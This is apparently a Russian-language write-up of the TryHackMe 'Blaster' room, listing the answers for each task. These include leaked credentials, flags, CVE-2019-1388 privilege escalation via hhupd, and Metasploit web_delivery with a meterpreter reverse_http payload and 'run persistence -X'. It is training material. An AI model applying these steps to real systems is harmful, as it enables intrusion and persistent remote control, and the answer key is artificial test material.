[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Blaster](https://tryhackme.com/r/room/blaster) 

Всего 4 задания:
## Задание 1
В этой комнате мы рассмотрим альтернативные режимы эксплуатации без использования Metasploit или инструментов 
эксплуатации в целом, помимо nmap и dirbuster. Чтобы завершить комнату, мы вернемся к этим инструментам для 
обеспечения устойчивости и дополнительных шагов, которые мы можем предпринять. Давайте без дальнейших промедлений 
развернем нашу целевую машину!   

Искусство одного из наших участников, Варга -  Профиль THM  -  Instagram  -  Blaster Merch  - Twitter

Эта комната — ремикс моей предыдущей комнаты Retro с некоторыми усложнениями, которые я добавил к той комнате, 
которая была удалена. Для повышения сложности и тренировки терпения, проверьте эту комнату после этой. Кроме того, 
эта комната — продолжение Ice. - DarkStar7471  

#### Ответьте на вопросы ниже
Разверните машину! Это Windows-бокс, поэтому дайте ему несколько минут (3-5 максимум), чтобы выйти в онлайн
```commandline
Ответ не нужен
```

## Задание 2
Теперь, когда мы запустили нашу цель, давайте выполним базовый перечень служб, работающих на ней!

### Ответьте на вопросы ниже
Сколько портов открыто в нашей целевой системе?
```commandline
2
```
Похоже, веб-сервер работает. Каково название страницы, которую мы обнаруживаем при переходе на него?
```commandline
IIS Windows Server
```
Интересно, давайте посмотрим, есть ли что-нибудь еще на этом веб-сервере, проведя фаззинг. Какой скрытый каталог мы 
обнаружим? 
```commandline
/retro
```
Перейдите в обнаруженный нами скрытый каталог. Какое потенциальное имя пользователя мы там обнаружим?
```commandline
wade
```
Просматривая посты, похоже, что у нашего пользователя недавно возникли некоторые трудности со входом. Какой 
возможный пароль мы обнаруживаем? 
```commandline
parzival
```
Войдите в систему через Microsoft Remote Desktop (MSRDP) и прочитайте user.txt. Каково его содержимое?
```commandline
THM{HACK_PLAYER_ONE}
```

## Задание 3
Теперь, когда мы получили доступ к нашей целевой системе, давайте посмотрим, сможем ли мы найти способ эскалации. 
Для начала давайте разведаем систему, чтобы посмотреть, сможем ли мы найти что-нибудь интересное. 

### Ответьте на вопросы ниже
При перечислении машины часто бывает полезно посмотреть, что пользователь делал в последний раз. Осмотрите машину и 
посмотрите, сможете ли вы найти CVE, который был исследован на этом сервере. Какой CVE это был? 
```commandline
CVE-2019-1388
```
Похоже, что для эксплуатации этой уязвимости необходим исполняемый файл, а пользователь не очень хорошо почистил его 
после тестирования. Как называется этот исполняемый файл? 
```commandline
hhupd
```
Исследуйте уязвимость и как ее эксплуатировать. Эксплуатируйте ее сейчас, чтобы получить повышенный терминал!
```commandline
Ответ не нужен
```
Теперь, когда мы создали терминал, давайте продолжим и запустим команду 'whoami'. Какой вывод будет после ее запуска?
```commandline
nt authority\system
```
Теперь, когда мы убедились, что у нас есть повышенный запрос, прочитайте содержимое root.txt на рабочем столе 
администратора. Каково его содержимое? Не выключайте терминал после эксплуатации, чтобы мы могли использовать его в 
четвертой задаче!  
```commandline
THM{COIN_OPERATED_EXPLOITATION}
```

## Задание 4
Теперь, когда мы полностью скомпрометировали нашу целевую машину, давайте вернемся к нашим инструментам эксплуатации,
чтобы мы могли получить удаленный доступ к оболочке и сохранить устойчивость. 

### Ответьте на вопросы ниже
Вернитесь к машине атакующего для следующего шага. Поскольку мы знаем, что на нашей машине жертвы запущен Защитник 
Windows, давайте попробуем другой метод доставки полезной нагрузки! Для этого мы будем использовать эксплойт 
веб-доставки скрипта в Metasploit. Запустите Metasploit сейчас и выберите «exploit/multi/script/web_delivery» для 
использования.   
```commandline
Ответ не нужен
```
Сначала давайте установим цель PSH (PowerShell). Какой целевой номер — PSH?

```commandline
2
```
После настройки полезной нагрузки настройте lhost и lport соответствующим образом, чтобы знать, на каком порту будет 
работать веб-сервер MSF и что он будет работать в сети TryHackMe. 
```commandline
Ответ не нужен
```
Наконец, давайте установим нашу полезную нагрузку. В этом случае мы будем использовать простую обратную полезную 
нагрузку HTTP. Сделайте это сейчас с помощью команды: 'set payload windows/meterpreter/reverse_http'. После этого 
запустите атаку как задание с помощью команды 'run -j'.  
```commandline
Ответ не нужен
```
Вернитесь в терминал, который мы создали с помощью нашего эксплойта. В этот терминал вставьте вывод команды 
Metasploit после запуска задания. В этом случае я обнаружил, что особенно полезно разместить простой веб-сервер 
Python (python3 -m http.server) и разместить команду в текстовом файле, поскольку копирование и вставка между 
машинами не всегда будут работать. После запуска этой команды вернитесь на нашу атакующую машину и обратите внимание,
что наша обратная оболочка создана.     
```commandline
Ответ не нужен
```
И последнее, но не менее важное: давайте рассмотрим механизмы сохранения через Metasploit. Какую команду мы можем 
запустить в нашей консоли meterpreter, чтобы настроить сохранение, которое автоматически запускается при загрузке 
системы? Не включайте ничего, кроме базовой команды и опции для запуска загрузки.   
```commandline
run persistence -X
```
Запустите эту команду сейчас с параметрами, которые позволяют ей подключиться обратно к вашей хост-машине в случае 
перезагрузки системы. Обратите внимание, что вам нужно будет создать слушателя через эксплойт обработчика, чтобы 
разрешить это удаленное подключение на практике. Поздравляем, теперь вы получили полный контроль над удаленным 
хостом и установили постоянство для дальнейших операций!    
```commandline
Ответ не нужен
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)